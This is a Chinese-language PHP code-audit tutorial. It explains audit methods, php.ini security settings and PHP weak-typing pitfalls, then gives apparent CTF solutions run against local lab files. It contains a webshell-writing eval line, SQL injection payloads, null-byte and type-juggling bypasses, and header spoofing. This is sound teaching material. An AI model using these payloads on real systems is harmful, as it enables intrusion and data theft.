# php代码审计1

0x00. 代码审计目的
0x01. 代码审计基础
0x02. 代码审计思路
0x03. PHP核心配置
0x04. 代码审计环境
0x05. 手动调试代码
0x06. PHP的弱类型
0x07. 学习"漏洞"函数
0x08. 代码审计总结

# 0x00. 代码审计目的

代码审计指的是对源代码进行检查，寻找代码中的bug以及安全缺陷(漏洞)。代码审计这是一个需要多方面技能的技术，也是需要一定的知识储备。我们需要掌握编程，安全工具的使用、漏洞原理、漏洞的修复方式、函数的缺陷等等，如果再高级一些，我们需要学习不同的设计模式，编程思想、MVC框架以及常见的框架。

那么对于小白应该是需要一个路线，一个流程。

先记住一句话"一切存在用户输入的地方都有可能存在漏洞"。

# 0x01. 代码审计基础

代码审计入门基础：html/js基础语法、PHP基础语法 ，面向对象思想，PHP小项目开发(Blog、注册登录、表单、文件上传、留言板等)，Web漏洞挖掘及利用，Web安全工具基本使用(burpsuite、sqlmap等)，代码审计工具(seay审计系统、zend studio+xdebug等)

代码审计两种基本方式：

- 通读全文源码：通读全文发作为一种**最麻烦**的方法也是**最全面**的审计方法。特别是针对大型程序，源码成千上万行。当然了解整个Web应用的业务逻辑，才能挖掘到更多更有价值的漏洞。
- 功能点审计：根据漏洞对应发生函数进行功能行审计，常会用到**逆向溯源数据**流方法进行审计。

代码审计两种基本方法：

- 正向追踪数据流：跟踪用户输入参数 -> 来到代码逻辑 -> 最后审计代码逻辑缺陷 -\> 尝试构造payload
- 逆向溯源数据流：字符串搜索指定操作函数 -> 跟踪函数可控参数 -> 审计代码逻辑缺陷 -\> 尝试构造payload

现cms可分大体两类：

- 单入口cms：不管访问哪个模块都使用同一个入口文件，常见的MVC框架采用这种模式。
- 多入口cms：每个模块都有一个入口文件(可以前端设置一个入口文件 index.php，后端创建一个入口文件admin.php，前后端的入口文件是独立的)。

# 0x02. 代码审计思路

从个人角度出发，如果环境允许的话，可以先选择做一个”程序员“再来做代码审计。

因为从开发者的位置去思考问## 题，可以快速定位问## 题。学习面向对象编程以及面向过程编程，编写一些项目提升对代码的理解能力，再是对各种漏洞可以独立挖掘利用并能理解漏洞的危害，这里我们主要针对PHP源码做审计。

接下来我们从三个层次开始我们的源码审计思路

1.确定要审计的源码是什么语言

2.确定该源码是单入口还是多入口

3.确定该语言的各种漏洞诞生的函数

# 0x03. PHP核心配置

一个漏洞在不同环境造成的结果也是不一样的。

由于关于php.ini配置的内容过于多，这里推荐浏览官方文档 [https://www.php.net/manual/zh/ini.php](https://www.php.net/manual/zh/ini.php)，我们在这里主要列下php.ini 主要使用的安全配置。

- `safe_mode = off`
    

> 用来限制文档的存取,限制环境变量的存取,控制外部程序的执行.**PHP5.4.0移除。**

- 限制环境变量存取`safe_mode_allowed_env_vars = string`
    

> 指定php程序可以改变的环境变量的前缀,当这个选项的值为空时,那么php可以改变任何环境变量,如果 如:safe\_mode\_allowed\_env\_vars = PHP_,当这个选项的值为空时,那么php可以改变任何环境变量。

- 外部程序执行目录`safe_mode_exec_dir = "/usr/local/bin"`
    

> 当安全模式被激活，safe\_mode\_exec_dir参数限制通过exec()函数执行的可执行文件到指定的目录。举例来说，如果你想限制在/usr/local/bin目录执行功能，你可以使用这个指令：
> 
> safe\_mode\_exec_dir = "/usr/local/bin"

- 禁用函数
    
    `disable_functions`
    

> 为了更安全的运行PHP,可以用此指令来禁止一些敏感函数的使用,当你想用本指令禁止一些危险函数时,切记把dl()函数也加到禁止列表,攻击者可以利用dl()函数加载自定义的php扩展突破disable_functions.配置禁止函数时可以使用逗号分隔函数名。

- COM组件`com.allow_dcom = false`
    

> PHP设置在安全模式下(safe_mode),仍允许攻击者使用COM()函数来创建系统组件来还行任意命令,推荐关闭这个函数。 使用COM()函数需要在PHP.ini中配置`extension=php_com_dotnet.dll`,如果PHPversion<5.4.5则不需要。

- 全局变量注册开关`register_globals = off`
    

> php.ini的register\_globals选项的默认值为OFF,在4.2版本之前是默认开启的,当设定为On时,程序可以接收来自服务器的各种环境变量,包括表单提交的变量,这是对服务器分厂不安全的, register\_globals = off时,服务器端获取数据的时候用$\_GET\['name'\]来获取数据。 register\_globals = on时,服务端使用POST或GET提交的变量,豆浆自动使用全局变量的值来接受。

- 魔术引号自动过滤`magic_quotes_gpc = on`
    

> PHP5.4.0被移除 magic\_quotes\_gpc = off 在php.ini中默认是关闭的,如果打开它,将自动把用户提交对sql的查询的语句进行转换,如果设置成ON,php会把所有的单引号,双引号,和反斜杠和空字符(NULL)加上反斜杠()进行转义 它会影响HTTP请求的数据(GET,POST.COOKIE),开启它会提高网站的安全性。

- 是否允许包含远程文件`allow_url_include = off`
    

> 该配置为ON的情况下,可以直接包含远程文件,若包含的变量为可控的情况下,可以直接控制变量来执行PHP代码。

- 是否允许打开远程文件`allow_url_open = on`
    

> 允许本地PHP文件通过调用url重写来打开或者关闭写权限,默认的封装协议提供的ftp和http协议来访问文件。

- HTTP头部版本信息`expose_php = off`
    

> 防止通过http头泄漏php版本信息。

- 文件上传临时目录`upload_tmp_dir =`
    

> 上传文件临时保存的目录,如果不设置的话,则采用系统的临时目录。

- 用户可访问目录`open_basedir = D:\WWW`
    

> 能够控制PHP脚本只能访问指定的目录,这样能够避免PHP脚本访问不应该访问的文件,一定程度上限制了。webshell的危害

- 内部错误选项`display_errors = on`
    

> 表明实现PHP脚本的内部错误,网站发布后建议关不PHP的错误回显。

- 错误报告级别`error_reporting(E_ALL & ~Enotice)`
    

> 具体列表推荐：[https://www.runoob.com/php/func-error-reporting.html](https://www.runoob.com/php/func-error-reporting.html)
> 
> 这里设置的作用是将错误级别调到最高,显示所有问## 题,方便环境部署时候排错。

# 0x04. 代码审计环境

PHP源码部署环境：Phpstudy 2018

集成开发环境：Zend Studio/Phpstorm

数据库管理工具：Navicat for MySQL 12

MySQL实时监控工具：MySQLMonitor

文本编辑工具：Sublime_Text3

代码审计辅助工具：Seay源代码审计系统、Search and Replace、Rips 0.55

代码审计辅助安全工具：渗透版火狐、BurpSuite、Sqlmap

# 0x05. 手动调试代码

echo  
exit();  
print_r  
var_dump();  
debug\_zval\_dump();  
debug\_print\_backtrace();  
echo "<script>alert($estr);</script>"";  
die("<script>alert($estr);</script>");

# 0x06. PHP的弱类型

1.比较符号 == 与 ===

- == 在进行比较的时候，会先将字符串类型转化成相同，如果整型跟字符型比较字符或从左往右提取整型直到遇到字符结束，再比较。
    
- === 在进行比较的时候，会先判断两种字符串的类型是否相等，当等号两边类型不同时，会先转换为相同的类型，再对转换后的值进行比较，如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照常数值进行比较.。
    

//字符串和数字比较  
var_dump(0=="admin");   //true  
echo '<br>';  
var_dump(1=="1admin");  //true  
echo '<br>';  
var_dump(1=="admin1");  //false  
echo '<br>';  
var_dump(0=="admin1");  //true  
echo '<br>';  
//数字和数组  
$arr = array();  
var_dump(0==$arr);  //false  
echo '<br>';  
//字符串和数组  
$arr = array();  
var_dump("0"==$arr);    //false  
echo '<br>';  
//"合法数字+e+合法数字"类型的字符串  
var_dump("0e123456"=="0e4456789");  //true  
echo '<br>';  
var_dump("1e1"=="10");  //true

2.array\_search 与 is\_array

- is_array:判断传入的是不是一个数组。
    
- array\_search（x，$数组）:在数组中寻找与指定值(x)相等的值，array\_search函数 类似于"=="，会进行类型的转换。
    

if(!is\_array($\_GET\['test'\])){  
exit();  
}  
​  
$test = $_GET\['test'\];  
​  
for($i = 0;$i<count($test) ;$i++ ){  
if($test\[$i\] === "admin"){  
echo "error";  
exit();  
}  
$test\[$i\] = intval($test\[$i\]);  
}  
​  
if(array_search("admin",$test) === 0){  
echo "flag";  
}else{  
echo "false";  
}

我们可以传入test\[\]=0来进行绕过，首先test是一个数组，符合is\_array的判断，然后test=0；在array\_search中0==admin为true，绕过了array_search。

![](_v_images/20201019223216787_2880.png)

3.in_array()函数

- array\_search()与in\_array()也是一样的问## 题。
    

$array=\[0,1,2,'3'\];  
var\_dump(in\_array('abc', $array)); //true  
var\_dump(in\_array('1bc', $array)); //true

4.is_number()函数

- 检测变量是否为数字或数字字符串,如果var是数字和数字字符串则返回TRUE,否则返回FALSE
    

$temp = $_GET\['password'\];  
is_numeric($temp) ? die("no numeric") : NULL;  
if($temp>9999){  
echo '我giao';  
}

![1603078795_5f8d0a8b2df0f2c11009f.png!small?1603078793930](_v_images/20201019223216660_4062.png)

在这里我们的payload需要的是一个大于9999的数字后面加上字符就可以了 这里构造的是9999+ 。

5.strcmp()函数

- 比较函数如果两者相等返回0，string1>string2返回>0 反之小于0。在5.3及以后的php版本中，当strcmp()括号内是一个数组与字符串比较时，也会返回0。
    

$pd = "6666";  
if(strcmp($_GET\['pwd'\],$pd) == 0){  
echo "giao";  
}else{  
echo "?";  
}

![1603078832_5f8d0ab0296ce7e92aaf0.png!small?1603078830946](_v_images/20201019223215627_7522.png)

函数接受到了不符合的类型，发生了错误，但是还是判断其相等。

6.switch()语句

- 如果switch是数字类型的case的判断时,switch会将参数转换为int类型
    

$pwd = "1ad";  
switch($pwd){  
case 1:  
echo "giao";  
break;  
case 2:  
echo "?";  
break;  
}

7.md5()函数

- 0e开头的全部相等（绕过==判断），两个字符串转换成MD5值时都是0e开头，0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。
    
- md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()`不会报错，只是会无法正确地求出array的md5值，返回false，这样就会导致任意2个array的md5值都会相等。
    

var_dump(md5('240610708') == md5('QNKCDZO'));//true  
​  
$array1=\[1,2,3\];  
$array2=\[4,5,6\];  
var_dump(md5($array1)===md5($array2)) //true

8.sha1()函数

- sha1函数和md5函数一样不能判断数组的值。
    

$array1=\[1,2,3\];  
$array2=\[4,5,6\];  
​  
var_dump(sha1($array1)===sha1($array2)); //true

9.empty与isset

- 变量为:0,"0",null,'',false,array()时,使用empty函数,返回的都是true
    
- 变量未定义或者为null时,isset函数返回的为false,其他都为true
    

$a = null;  
$b = 0;  
$c = "";  
var_dump(empty($a));  
var_dump(empty($b));  
var_dump(empty($c));  
var_dump(isset($a));  
var_dump(isset($b));  
var_dump(isset($c));

10.类型比较问## 题以及类型转换问## 题

此处推荐文章：[https://www.jb51.net/article/93447.htm](https://www.jb51.net/article/93447.htm)

# 0x07. 学习漏洞函数

1.全局变量/超全局变量

全局变量：

- 定义在函数外部的就是全局变量，它的作用域从定义处一直到文件结尾。
    
- 函数内定义的变量就是局部变量，它的作用域为函数定义范围内。
    
- 函数之间存在作用域互不影响。
    
- 函数内访问全局变量需要 **global**关键字或者使用 **$GLOBALS\[index\]**数组。
    

超全局变量：

- 超全局变量 在 PHP 4.1.0 中引入，是在全部作用域中始终可用的内置变量。
    
- PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global $variable; 就可以访问它们。
    

**常用的超全局变量有9个：**

- $GLOBALS
    
- $_SERVER
    
- $_REQUEST
    
- $_POST
    
- $_GET
    
- $_FILES
    
- $_ENV
    
- $_COOKIE
    
- $_SESSION
    

此处推荐文章：[https://blog.csdn.net/zhichaosong/article/details/80507516](https://blog.csdn.net/zhichaosong/article/details/80507516)

2.SQL注入

select  
update  
insert into  
delete

注：此处非函数，主要找常用的SQL语句

3.代码执行

eval()  
usort()  
uasort()  
assert()  
array_map()  
preg_replace()  
array_filter()  
call\_user\_func()  
create_function()  
call\_user\_func_array()  
文件操作函数：  
fputs(fopen('shell.php','w'),'<?php eval($_POST\[cmd\])?>');   
动态函数：$\_GET\['a'\]($\_GET\['b'\])

4\. 命令执行

system()  
exec()  
passthru()  
shell_exec()

5\. XSS跨站脚本攻击

print  
print_r  
echo  
printf  
die  
var_dump  
var_export

6.文件上传漏洞

move\_uploaded\_file()

7.文件包含漏洞

include()  
include_once()  
require()  
require_once()

伪协议

file:// — 访问本地文件系统  
http:// — 访问 HTTP(s) 网址  
ftp:// — 访问 FTP(s) URLs  
php:// — 访问各个输入/输出流（I/O streams）  
zlib:// — 压缩流  
data:// — 数据（RFC 2397）  
glob:// — 查找匹配的文件路径模式  
phar:// — PHP 归档  
ssh2:// — Secure Shell 2  
rar:// — RAR  
ogg:// — 音频流  
expect:// — 处理交互式的流

此处推荐文章：[https://segmentfault.com/a/1190000018991087](https://segmentfault.com/a/1190000018991087)

8.任意文件下载

fopen()  
readfile()  
file\_get\_contents()

9.任意文件删除

unlink()

10.任意文件读取

file()  
fgets()  
fgetss()  
fopen()  
readfile()  
fpassthru()  
parse\_ini\_file()  
file\_get\_contents()

11.变量覆盖

$$  
extract()  
parse_str()  
import\_request\_variables()//此函数只能用于PHP4.1 ~ PHP5.4

12.反序列化漏洞

unserialize()

魔术方法

- __construct()//每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作
    
- __destruct()//某个对象的所有引用都被删除或者当对象被显式销毁时执行
    
- __call() //在对象上下文中调用不可访问的方法时触发
    
- __callStatic() //在静态上下文中调用不可访问的方法时触发
    
- __get() //用于从不可访问的属性读取数据
    
- __set() //用于将数据写入不可访问的属性
    
- __isset() //在不可访问的属性上调用isset()或empty()触发
    
- __unset() //在不可访问的属性上使用unset()时触发
    
- __sellp() //使用serialize时触发
    
- __wakeup() //使用unserialize时触发
    
- __toString() //把类当作字符串使用时触发
    
- __invoke() //当脚本尝试将对象调用为函数时触发
    
- \_\_set\_state()//当调用 var_export() 导出类时，此静态方法会被自动调用。
    
- __clone()//当使用 clone 复制一个对象时自动调用
    
- \_\_debuginfo()//使用 var\_dump() 打印对象信息时自动调用
    

# 0x08. 审计入门总结

先从Web漏洞原理开始理解再到漏洞的挖掘以及利用，我们就来到了PHP代码审计这个方向进行进修。这里我们开始学习PHP开发，以及熟悉下开发者的开发思想，站在开发者角度去思索代码。再是掌握漏洞对应发生函数使用，再是学习正则表达式。

审计路线：Demo->综合漏洞靶场->网上审计过的CMS->多入口CMS->单入口CMS->框架->函数缺陷

# 推荐一些demo：

- [https://github.com/bowu678/php_bugs](https://github.com/bowu678/php_bugs)
    
- [https://github.com/hongriSec/PHP-Audit-Labs](https://github.com/hongriSec/PHP-Audit-Labs)
    
- [https://github.com/Xyntax/1000php](https://github.com/Xyntax/1000php)
    
- [https://github.com/SukaraLin/php\_code\_audit_project‘](https://github.com/SukaraLin/php_code_audit_project)


## 题的源码在Github: bowu (Github)，可以自行部署，也可以静态审计。

## 题1 extract变量覆盖
http://127.0.0.1/Php_Bug/extract1.php?shiyan=&flag=1
## 题3 多重加密
<?php

​

$arr = array(['user'] === 'ichunqiu');

$token = base64_encode(gzcompress(serialize($arr)));

print_r($token);

// echo $token;

​

?>


eJxLtDK0qs60MrBOAuJaAB5uBBQ=
## 题4 SQL注入_WITH ROLLUP绕过
admin' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -
资料：
实验吧 因缺思汀的绕过 By Assassin（with rollup统计）

使用 GROUP BY WITH ROLLUP 改善统计性能

因缺思汀的绕过

## 题5 ereg正则%00截断
http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*

资料：
eregi()

## 题6 strcmp比较字符串
http://127.0.0.1/Php_Bug/06.php?a[]=1
这个函数是用于比较字符串的函数

int strcmp ( string $str1 , string $str2 )

// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。

可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL,而判断使用的是==，NULL==0是 bool(true)

## 题7 sha()函数比较绕过
http://127.0.0.1/Php_Bug/07.php?name[]=1&password[]=2
===会比较类型，比如bool sha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型

?name[]=a&amp;password[]=b
## 题8 SESSION验证绕过
http://127.0.0.1/Php_Bug/08.php?password=
删除cookies或者删除cookies的值

资料：
【Writeup】Boston Key Party CTF 2015(部分## 题目)

## 题9 密码md5比较绕过
?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456
资料：
DUTCTF-2015-Writeup

## 题10 urldecode二次编码绕过
h的URL编码为：%68，二次编码为%2568，绕过

http://127.0.0.1/Php_Bug/10.php?id=%2568ackerDJ
资料：
URL编码表

## 题11 sql闭合绕过
构造exp闭合绕过 admin')#

## 题12 X-Forwarded-For绕过指定IP地址
HTTP头添加X-Forwarded-For:1.1.1.1

## 题13 md5加密相等绕过
http://127.0.0.1/Php_Bug/13.php?a=240610708
==对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行

var_dump(md5('240610708') == md5('QNKCDZO'));

var_dump(md5('aabg7XSs') == md5('aabC9RqS'));

var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));

var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));

var_dump('0010e2' == '1e3');

var_dump('0x1234Ab' == '1193131');

var_dump('0xABCdef' == ' 0xABCdef');

​

md5('240610708'); // 0e462097431906509019562988736854 

md5('QNKCDZO'); // 0e830400451993494058024219903391 

把你的密码设成 0x1234Ab，然后退出登录再登录，换密码 1193131登录，如果登录成功，那么密码绝对是明文保存的没跑。

同理，密码设置为 240610708，换密码 QNKCDZO登录能成功，那么密码没加盐直接md5保存的。

资料：
PHP 探测任意网站密码明文/加密手段办法

## 题14 intval函数四舍五入
1024.1绕过

资料：
PHP intval()函数利用

## 题15 strpos数组绕过NULL与ereg正则%00截断
方法一： 既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.

方法二： 字符串截断,利用ereg()的NULL截断漏洞，绕过正则过滤 http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu 错误 需将#编码 http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu 正确

## 题16 SQL注入or绕过
$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';
?username=admin\'\' AND pass=\''or 1 #&password=
## 题17 密码md5比较绕过
//select pw from ctf where user=''and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #
?user='and 0=1 union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456
## 题18 md5()函数===使用数组绕过
若为md5($_GET['username']) == md5($_GET['password']) 则可以构造： http://127.0.0.1/Php_Bug/18.php?username=QNKCDZO&password=240610708 因为==对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了 也可以使用数组绕过http://127.0.0.1/Php_Bug/18.php?username[]=1&password[]=2

但此处是===，只能用数组绕过，PHP对数组进行hash计算都会得出null的空值 http://127.0.0.1/Php_Bug/18.php?username[]=1&password[]=2

## 题19 ereg()函数strpos() 函数用数组返回NULL绕过
方法一： ereg()正则函数可以用%00截断 http://127.0.0.1/Php_Bug/19.php?password=1%00--

方法二： 将password构造一个arr[]，传入之后，ereg是返回NULL的，===判断NULL和 FALSE，是不相等的，所以可以进入第二个判断，而strpos处理数组，也是返回NULL，注意这里的是!==，NULL!==FALSE,条件成立，拿到flag``http://127.0.0.1/Php_Bug/19.php?password[]=

## 题20 十六进制与数字比较
这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，0x开头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de，在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag

echo  dechex ( 3735929054 ); // 将3735929054转为16进制